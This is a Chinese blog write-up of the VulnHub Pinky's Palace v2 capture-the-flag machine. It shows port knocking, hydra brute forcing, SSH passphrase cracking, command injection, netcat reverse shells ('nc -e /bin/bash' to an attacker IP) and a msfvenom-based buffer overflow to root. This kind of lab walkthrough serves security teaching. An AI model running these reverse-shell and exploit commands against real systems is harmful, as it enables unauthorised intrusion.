> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/6TzCxi3tnJFuDPH3JyZ7IQ)

大余安全  

一个每日分享渗透小技巧的公众号![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPTQKiaXksbZia7PmHLPX2vnCWsznInTj3b9TFYtTDIYG6lDGJZYYSv72NsVWF24Kjlo4MT29tEOQSg/640?wx_fmt=png)

  

  

大家好，这里是 **大余安全** 的第 **31** 篇文章，本公众号会每日分享攻防渗透技术给大家。

![](https://mmbiz.qpic.cn/mmbiz_png/Q6e43UC3v1HiaBRGY9kMxh3tLO1aBBkGyOkLibppRwafQGLWpwuJO8ejicFmygc0xEug5gKuge6miasNIBiaIaiak0iaQ/640?wx_fmt=png)

靶机地址：https://www.vulnhub.com/entry/pinkys-palace-v2,229/

靶机难度：中级（CTF）

靶机发布日期：2018 年 3 月 18 日

靶机描述：一个现实的 Boot2Root。获得对系统的访问权限并阅读 / root/root.txt

进入难度：容易 / 中级

扎根困难：中级 / 困难

目标：得到 root 权限 & 找到 flag.txt

请注意：对于所有这些计算机，我已经使用 VMware 运行下载的计算机。我将使用 Kali Linux 作为解决该 CTF 的攻击者机器。这里使用的技术仅用于学习教育目的，如果列出的技术用于其他任何目标，我概不负责。

![](https://mmbiz.qpic.cn/mmbiz_png/TLAfQEhpjHSPbp8RvqloqZfhr9oq4s6WqbTll9md0ZdsSxQCd5OvTakCISlraZ8vylH1cV3xQ3X6wE358HPuFQ/640?wx_fmt=png)

  

一、信息收集

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KNq0snS4aGhbkfluswTSh7CiaUhOez0mttFRT19UTWHRInac9G1nwP7BVibj4PH52IG5Zspv0v5ibRRw/640?wx_fmt=png)

这边直接看到了靶机的 IP：192.168.182.132

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KNq0snS4aGhbkfluswTSh7CMBX2S32Bz6yQfCF7wRmUx1WicyoIhksiczyQUsS4hzibvtLsjau9LKCqw/640?wx_fmt=png)

可以看到开放了 80、4655、7654、31337 端口，这是 wordpress 框架的 web...wpscan 要用上了...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KNq0snS4aGhbkfluswTSh7C0NKy3IU6PSh12koQ545H7nAujqXwfu4jDnaQ2UWH5Df8DicVhUQcxeQ/640?wx_fmt=png)

先按照作者的要求添加下...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KNq0snS4aGhbkfluswTSh7CxA9OdlD1gO4ibqZ9OsUybU4H1JSfnOxSLAiafDB4kRuYA8aNQHD8Agcw/640?wx_fmt=png)

```
echo 192.168.182.132 pinkydb | sudo tee -a /etc/hosts
```

意思是服务 IP 变成了 pinkydb...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KNq0snS4aGhbkfluswTSh7C3IibR1rBwaIQEnkMY302GiafOTYfYcL8M0dpZjtlbchv1YZ6cVXkQaibw/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KNq0snS4aGhbkfluswTSh7C1IeVEhDJcr1PFOPTt4ibuicfIRswKV6C6CpIchb8xYntLdiaxd3UQcIeQ/640?wx_fmt=png)

访问服务器也提示了 wordpress 框架搭设的...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KNq0snS4aGhbkfluswTSh7CdxUYJshDWuxghcIiayX3ccwfWychnjA3FG6jNCshaHvv3d8jaAgVNNg/640?wx_fmt=png)

```
发现用户名：pinky1337
```

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KNq0snS4aGhbkfluswTSh7CZg4WOSk51csCudjFUstgO9ribNZcCZaIZSNEic1SdfJB3ibeSuTWY3sSQ/640?wx_fmt=png)

发现了 wordpress/ 目录这个仿佛是一个全新未安装的 wordpress，可以自己安装然后进后台 getshell

尝试安装 wordpress 发现 wp-config.php 不可写，这条路行不通了...

上面扫描利用的是 common.txt 没发现什么... 换 big.txt 试试...（common 目录量就 4612，big 有 20458 个，比较全）

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KNq0snS4aGhbkfluswTSh7CFPU4UIGXlwibJaNnQm6dRT7qdXWQxepAibXuibibRwanVAhrQL6pMckQuQ/640?wx_fmt=png)

都扫描到了 / secret/ 和 / wp-admin / 目录...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KNq0snS4aGhbkfluswTSh7C1mGeTN2gh7Vys63GVCxepOCz8EjK9sE51C7RaliaoKCyxCLebu0KwEg/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KNq0snS4aGhbkfluswTSh7CTHd8QB0wzzGmMjxIgXFhopqh4hkCgMGQWDEriaDj3xw8enZYe4lGCAg/640?wx_fmt=png)

bambam.txt 下是三个端口号，但是 nmap 并没有扫描出这些端口，试着打开看看...（前面章节端口转发也有类似的场景...）

这边回看 nmap 后发现 4655、7654、31337 端口都是 filtered 状态... 估计和这三个端口有关系...

我这边用新的方式打开这三个隐藏端口...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KNq0snS4aGhbkfluswTSh7CHTDEIdXM5ic6bwET4AYXYgNvmpwRqCLbrOiajVKeRusV5jVqyB3wWHhQ/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KNq0snS4aGhbkfluswTSh7C8RicRtXVGSAzj5Qh9hHZqtQjypR4zpvshR4P0JYBuicnlNTWgLwPibMTg/640?wx_fmt=png)

```
sudo apt-get install knockd iptables-persistent
```

（knockd 可以打开隐藏端口，需要按照它）  

这边看到已经打开了这三个端口，nmap 扫描后发现，果然，这应该是端口在转发...

4655、7654、31337 端口都是 filtered 状态变成了 open...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KNq0snS4aGhbkfluswTSh7Cn5uebHxPCObQAjm0ibvAXOGhibozzvXpjzLoBic3g4SyoToznDyVnl0xw/640?wx_fmt=png)

nmap 扫除 31337 上有后门存在... 我尝试 nc 上去后，好像是一个外壳，但是每个命令都刚刚返回并且连接关闭..

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KNq0snS4aGhbkfluswTSh7CDlZ6yC0aH5ickzvl81dpZbLYRTBzT7kEZAFlyLEHCmsdbqhUlCw1TSA/640?wx_fmt=png)

访问 7654，返回 403... 让我用 host 里改的值去访问...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KNq0snS4aGhbkfluswTSh7CK5jNqC87jiaJEkJsJ1OQyQN9EwYooDXGll8djHlwryTKP2pFX0KybMw/640?wx_fmt=png)

进去...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KNq0snS4aGhbkfluswTSh7CVTO7lEtFooENDibdeZPXxiaM33xsXh4mrBHSMJAW9lClJaPP4Wc1kuVA/640?wx_fmt=png)

我用 admin、pinky、pinky1337 知道的用户名去一个一个尝试登录... 都进不去...

这边用九头蛇爆破...

这边使用 fasttrack.txt 和 rockyou.txt 都没找到密码...

我就使用 cewl 对靶机站点生成了一个单词列表（wordpress 站点）

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KNq0snS4aGhbkfluswTSh7CibCfNcyVp9M527AOeI0uicTobicS92ZUa6QaArxehd7laSTe9tlreiafbQ/640?wx_fmt=png)

```
hydra -L user.txt -P ./dayu.txt pinkydb -s 7654 http-post-form "/login.php:user=^USER^&pass=^PASS^:F=Invalid Username or Password!"
login: pinky   password: Passione
login: pinky1337   password: Blog
```

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KNq0snS4aGhbkfluswTSh7CcrhVxjnGsEZtL2MjibLSwOoR1QTQsZomGMmMwIUK6muuCibTDkWFhfzg/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KNq0snS4aGhbkfluswTSh7C9fVZhPxxzgf5vqEibWdBVwW5prSzK26f4Nxaz5D75zfP7dJm3GHCu7w/640?wx_fmt=png)

登录后有个 RSA 密匙... 和一段话，说 Stefano 是实习生 web 安全开发员，提供了 RAS 密匙，供大家登录...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KNq0snS4aGhbkfluswTSh7C7RzryrKjiaYG4LZw6IPNstrdBq7Lcn2T7Ih4gDRVR7waDF85CNo30Mg/640?wx_fmt=png)

下载下来后，使用它...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KNq0snS4aGhbkfluswTSh7CXlLyhYGfUosrA3lQpWxgKRXRVVb352dvVs8bFbY00uQNv08gCCakgQ/640?wx_fmt=png)

发现还需要 passphrase 才可以登录... 用 ssh2john 配合 john 来破解...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KNq0snS4aGhbkfluswTSh7CHicyUQoF2BhicGxCkDuSGhMe78XMQAgo8Wvgl1jV7PHPzuGeYDrCEHxQ/640?wx_fmt=png)

```
ssh2john id_rsa > dayuid_rsa
john --wordlist=/usr/share/wordlists/rockyou.txt dayuid_rsa
RAS的密匙密码为secretz101
```

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KNq0snS4aGhbkfluswTSh7Ce6RWoMryARFcFmtqlDNfpjBYuqdkvaQa7stic8CrIKFiaibTyyxPiau3rw/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/6DdW6admPmWicucEOicwONQBeMWRA7Pq57A9xCTGbIWomiboqObS0bEetoo2qW2hHk2E5GOcuQYUqSlQT5BKsDqRQ/640?wx_fmt=png)

二、提权

![](https://mmbiz.qpic.cn/mmbiz_png/M39rvicGKTibrmYlY2VW5XChia77yhteBC7iarNdYSwicq64NZrCHeSZqRpsFRTZkpfgclSWaibqftONNMWLkz6QjyoQ/640?wx_fmt=png)

成功登陆...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KNq0snS4aGhbkfluswTSh7C5y7NEicyv10nI7TPZAtIyM559WLfwBJAn4pAEeB3hntkDA0pql8eTsA/640?wx_fmt=png)

找了会，进入 tools 目录下，在 note.txt 中有段话，让我用 qsub 小程序来发送会话...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KNq0snS4aGhbkfluswTSh7CibaMAqmtUqzEoGPoYShMTkNH4M2XvLIGA4ug0bPhawqjv8Mic0C0MGdg/640?wx_fmt=png)

可以看到 setuid 位启用为 pinky... 执行后都是正确输出... 应该存在缓冲区溢出... 我试试

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KNq0snS4aGhbkfluswTSh7CPt7TsWPgY8DNpSkakEo7M0LryU7mTBmRNniaKjgXJem0t4zVLXqonsg/640?wx_fmt=png)

```
./qsub $(python -c "print 'A'*100")
```

果然存在...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KNq0snS4aGhbkfluswTSh7CpAIiaiahMZMelTfSe7KACiakhllj7Yav6huKkNKk9WMMMtejuzVN4Jibxg/640?wx_fmt=png)

gdb 还不可用...

这边发现它存在 www-data 组权限中... 我需要读取 qsub 文件的权限...

这边回到 web 页面查看下...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KNq0snS4aGhbkfluswTSh7CUMKKYpNaznicJFmKBKZVj4CXib2JUYa8rsrX4AKtUWI3DwMQickBcrgjw/640?wx_fmt=png)

查看 / etc/passwd 确实存在 LFI 后...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KNq0snS4aGhbkfluswTSh7C8icencQWad5XUHGMJPp5uyBaFZYHfA13LudZ4k12nibZoLMtf4nKzCZg/640?wx_fmt=png)

发现了可读字符串中是 TERM... 这是环境变量...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KNq0snS4aGhbkfluswTSh7CqOpXkh82KFGDlvlKmkJEEXb1RfTRNabKHRJydbUQiaz8HHiaHjFny99Q/640?wx_fmt=png)

我输入 xterm-256color 后...Welcome to Question Submit!，这边直接可以输入 shell...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KNq0snS4aGhbkfluswTSh7Cxp9r0kUuHbxgmuaPbVlicwzh0yClhWISwcfH4dn0AysaccMicJrneXmg/640?wx_fmt=png)

```
/bin/echo %s >> /home/pinky/messages/stefano_msg.txt
./qsub '$(nc -e /bin/bash 192.168.182.149 4444)'
```

利用 / bin / 输入... 然后将 shell 植入里面即可...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KNq0snS4aGhbkfluswTSh7CtzdqCoibmHqLJ9cakibDGdOt2jrSOqxHEZnRO6HNFbkgmSHKGYus8guA/640?wx_fmt=png)

成功进入 pinky 用户...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KNq0snS4aGhbkfluswTSh7CI2UXGW0eZq6a87h5I46LMpPNVwn1pLumibeyVEIaU1X17ictwHtUQjlA/640?wx_fmt=png)

每个地方都看看.... 没啥信息.... 按照套路应该有一个文件可以写入 shell 的... 继续找

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KNq0snS4aGhbkfluswTSh7CjWkXBzFuV2mVbyib4SJibwejogWGnUQxzxDOCCXSvuTSrRn0ZffNJO9A/640?wx_fmt=png)

发现. sh 文件... 想查看发现组的权限不是 pinky，用 newgrp 来切换当前用户组即可...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KNq0snS4aGhbkfluswTSh7C3qTQmvKZQ33gyvicvRPyDTmic9M2ficcfFunI8DbAJObhiaNpkntE6mibZw/640?wx_fmt=png)

这边查看后，目前我具有写访问权... 它应该是个备份脚本... 放在这不起眼的地方，我先尝试写入 shell 看看..

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KNq0snS4aGhbkfluswTSh7C86D9ceqiaMvd7vGFVAljDHQ0JEafw5GwnibYDzIsmiagBlqx0ibr9C4eiag/640?wx_fmt=png)

```
echo "nc -e /bin/bash 192.168.182.149 1234" > backup.sh
```

查看到已经成功写入了...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KNq0snS4aGhbkfluswTSh7CKvLcSxGicdov5SPRPJj1ibCib5fCZVSfICxd9cH1wXgtyPp4t3dicMJPlg/640?wx_fmt=png)

等了几分钟后... 发现成功连接... 了...  这是自动执行的脚本...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KNq0snS4aGhbkfluswTSh7C4uOPGNR6iapQpHt1FIhFTIMYskImyrersmjbfWcQNRAzUrQmlURJjVw/640?wx_fmt=png)

成功进入了 demon 用户...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KNq0snS4aGhbkfluswTSh7CdTok5eWx505z65Eib3UEbyGKz4LSYsynoVVx6epj5WKTLx4FEiciaf1zw/640?wx_fmt=png)

发现具有 root 身份运行的 daemon 目录...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KNq0snS4aGhbkfluswTSh7CXhibC2DjsLUibegbmZ84Fxyf4SzDmyEVib5tx30CMiacFEoFB5h4wxcFBw/640?wx_fmt=png)

发现 panel 应用程序，查看...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KNq0snS4aGhbkfluswTSh7CTAMdibHvT0J5aXVfbNMY2giarjvaB9qiaX340SN2jnnJm4v8rxwsdN7JA/640?wx_fmt=png)

执行发现这是一个不完整的壳... 应该又存在缓冲区溢出... 没装 gdb....

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KNq0snS4aGhbkfluswTSh7CEJwVddU8AHib0v9N4DNfSRe3DGvib7Ogug0sCnWGLEnqh2uozcbEXG6A/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KNq0snS4aGhbkfluswTSh7CHsl1NZMGgBtZsHnkS6fkpBOUUDukCey5ZnlUIla9xFfr7L39dKczpA/640?wx_fmt=png)

```
nc -nlvp 1111 > panel
nc 192.168.182.149 1111 < panel
```

发现这上面装了 NC，这边利用 nc 把 panel 程序放到 kali 上分析...

这边过了 7~8 小时... 因为我是 32 位的 kali 打开 panel 有问题... 一直报错，用 IDA 在 windows10 上打开也一直报错.. 后来安装了 64 位的 kali 后使用就能打开了.. 看来这个靶机的 panel.exe 限制了...

继续！！！（在 64 位 kali 上继续渗透）

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KNq0snS4aGhbkfluswTSh7CcHBcmcJhxhH1RGoibpzeXwh2B3GhnoCLqqFeD9kfvB1vLWYT24MlShg/640?wx_fmt=png)

这边用 gdb 正常打开... 这边前面运行已经知道这是个 31337 存在的不完整外壳是同一程序.. 这边绑定下 31337 然后进行分析...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KNq0snS4aGhbkfluswTSh7CNFrGEhibaxDVL1hmB4b0EYYbVBia4lRv3BtgrbqpqEqfMB7tgHrrhxicQ/640?wx_fmt=png)

```
(gdb) set follow-fork-mode child
(gdb) set detach-on-fork off
```

前面输入 31337 端口什么内容，就返回什么内容，这边绑定下 fork 来允许多个连接... 在 gdb 上设置为跟随 fork 并保持它们的绑定...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KNq0snS4aGhbkfluswTSh7Cdg0EbOJVwLSduOlLt7pAic9TjYPOvcugwYzL5ONDSlvOWibl0AjTxWoQ/640?wx_fmt=png)

开始观察程序，这边按照缓冲区问题总结，应该输出都放在 handlecmd 函数里...

这边打算用 strcpy 代替 strncpy 方法，来查看到缓冲区溢出的位置...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KNq0snS4aGhbkfluswTSh7Cd033Na3oT99Lv1e66fb9IVvrPDyggBA6vQ9A7v3L60sMiaOLEnFyZug/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KNq0snS4aGhbkfluswTSh7CWrQbyU8NeGUpLtCBICmwkPVc5bick19STG77wPNhdo2dx8bbHiavZANw/640?wx_fmt=png)

```
echo $(python -c "print 'A'*500") | nc localhost 31337
```

可以看到 segfault 段错误是：

```
0x00000000004009aa in handlecmd ()
```

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KNq0snS4aGhbkfluswTSh7CchpJqSlUbB75DcYwFGjLco8NzRDUKzb7P3dX3yEk4FeYNq1RRyjEyw/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KNq0snS4aGhbkfluswTSh7Cuccup3bnyQSrkAnMZ0sltjdnAVnzf9ysMnW6fdaicG8FLGHUUI2PIvQ/640?wx_fmt=png)

我需要找到他溢出的位置，输入 200，还是溢出了...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KNq0snS4aGhbkfluswTSh7Cgib3icPmyLnE84S0Ria3yQg4w7icUnfP7VWBHiccrkuJeiaId4jsJfibfjjqA/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KNq0snS4aGhbkfluswTSh7CMWKhGAibSsJdhBeo9dBBnu6TjibmFCK4Q0QULruqXJl5IRIXOFaMWriaQ/640?wx_fmt=png)

崩溃发生在 113 字节处，从那里发现总共花了 124 个字节来覆盖返回地址的 RIP 寄存器，检查溢出后的内存，在 strcpy 之后放置了一个断点...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KNq0snS4aGhbkfluswTSh7CRZtEdw2geoJiasCBedWq5zyQnx3nib08bxpmUCic3pgTialvQ0hHgbxntw/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KNq0snS4aGhbkfluswTSh7CalEG2icTRej8j5bhlMaO4qdOknxDOnQcBoVOiaIxddOObg2uMgQpzSaw/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KNq0snS4aGhbkfluswTSh7CtbR61E4cic9wpCT1eOlGFTt4vEnnwNmeNmialW6joBPkfQxMd4oj56EQ/640?wx_fmt=png)

这边将 A 处将 shellcode 放入其中，在 B 处将 return addr 放入其中，从而溢出该程序...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KNq0snS4aGhbkfluswTSh7CErypFVviac9ulrruPQVmE0z8KZK10VX5go9pUKREibQp1K7IAMac11Mw/640?wx_fmt=png)

检查了寄存器和堆栈...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KNq0snS4aGhbkfluswTSh7CkFKUic7SWnYAICQtZTaFMKUqZkaPUzLx6L7QRfTPerZgibPA9V2pkE2w/640?wx_fmt=png)

可以看到我安装了一个名为 peda 的 gdb 扩展...

```
[地址](https://github.com/longld/peda)
```

找到一种方法来在返回地址停止工作之前，覆盖最多 6 个字节的返回地址，但是需要 8 个字节来写入我的 shellcode，最后发现 RSP 寄存器指向 shellcode 的起始位置，所以我改用 peda 定位对 RSP 的调用...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KNq0snS4aGhbkfluswTSh7CEeOyKGm8vuH4sH8POEeKatV4CDA4cuvAQHAB1AWL9qRhYOjF8pIVkg/640?wx_fmt=png)

地址 0x400cfb 处 有一条 rsp 调用指令，这将是我们利用该漏洞的返回地址...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KNq0snS4aGhbkfluswTSh7Cib7sOESbp6iaS2DLV6ByNxzSB6HWdLurbibibSNFSjflRtshHO6wqiad6Kw/640?wx_fmt=png)

```
msfvenom -a x64 -p linux/x64/shell_reverse_tcp LHOST=192.168.182.133 LPORT=4444 -b 00 -f python
```

这边使用 msfvenom 生成 shellcode... 注意程序使用 strcpy 来触发溢出，所以 shellcode 里不能含有 null 字符，不然会截断...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KNq0snS4aGhbkfluswTSh7CAYS0x4mWibxvWTwTbcncaWp1uRyI7rU11los2IvW5my25HXemibiarq8w/640?wx_fmt=png)

然后运行即可...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KNq0snS4aGhbkfluswTSh7CGINFNeoWVY7DRHjg3ib1bhfqIXpaqnXASJk2B8ZIsgYGxbaoL7jsUaQ/640?wx_fmt=png)

成功获取 root 和 flag 文件

![](https://mmbiz.qpic.cn/mmbiz_png/gBSJuVtWXPZE73MPxL1VoDjO3DFaxJA2MQpSSibwsXKVf4VIHh8S9fZXT8pq1ALE3hWEN22AaniaghxGrJqjEsxw/640?wx_fmt=png)

这靶机挺难的... 继续脑补缓冲区溢出....

由于我们已经成功得到 root 权限 & 找到 flag.txt，因此完成了简单靶机，希望你们喜欢这台机器，请继续关注大余后期会有更多具有挑战性的机器，一起练习学习。

如果你有其他的方法，欢迎留言。要是有写错了的地方，请你一定要告诉我。要是你觉得这篇博客写的还不错，欢迎分享给身边的人。

![](https://mmbiz.qpic.cn/mmbiz_png/ymNhlIRQRwIDdqQDCiblECK9VN2KquqTzJXM7etEnDcIpDdITqzFuiapav9TDnIiaGgf1e4sP9IO6B5NEtEyg2t5w/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/eGDabDaNAhQ72wHWRToOUZR31X9kamiak0wrpr3lxKHpuoTpia329Xu6T0OTYlZic9XeEyQ4twasnibb924VBgIt1g/640?wx_fmt=png)

如果觉得这篇文章对你有帮助，可以转发到朋友圈，谢谢小伙伴~

![](https://mmbiz.qpic.cn/mmbiz_png/c5xrRn4430AnqkfAJc38Vpnc5XiaADLTjiciciaibYU4EHw3Nuh7YMtuB0hz3sb8Em9iatt5skAsibuuysPLdLY5LtWOw/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/p3lIbvldZiabdI5iaCb3icRhtygUuo2sp6Hcdq0ANlpy5W3gL628uq032jsoVnGnl6HdGrgDXjfazFtkp6IInibDdQ/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPqjaFWwyrrhiciahSpOibxqKvSIFX0iaPcG00CjYIwQDwIDeIicmFMlOVNyhWYVSE8pJK566UK3YOUNWQ/640?wx_fmt=png)

欢迎加入渗透学习交流群，想入群的小伙伴们加我微信，共同进步共同成长！

![](https://mmbiz.qpic.cn/mmbiz_png/ndicuTO22p6ibN1yF91ZicoggaJJZX3vQ77Vhx81O5GRyfuQoBRjpaUyLOErsSo8PwNYlT1XzZ6fbwQuXBRKf4j3Q/640?wx_fmt=png)  

大余安全

一个全栈渗透小技巧的公众号

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPTQKiaXksbZia7PmHLPX2vnCSsnsc7MHh257oYRic1MOT8qibABNUEnTq9DUL7QBwnS52EheJf4m8iaTQ/640?wx_fmt=png)